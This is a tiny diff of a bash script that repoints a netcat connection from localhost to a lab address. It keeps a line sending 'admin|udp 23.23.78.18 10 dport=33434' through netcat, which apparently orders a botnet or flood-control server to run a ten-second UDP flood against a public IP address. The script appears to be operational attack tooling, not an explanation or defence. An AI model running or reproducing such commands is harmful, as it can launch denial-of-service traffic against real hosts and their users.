@@ -1,7 +1,7 @@
 #!/bin/bash
 TEMPO=10
 USR='admin'
-NC='nc localhost 101'
+NC='nc 192.168.56.3 101'
 
 #UDP
 echo "$USR|udp 23.23.78.18 $TEMPO dport=33434 | $NC"
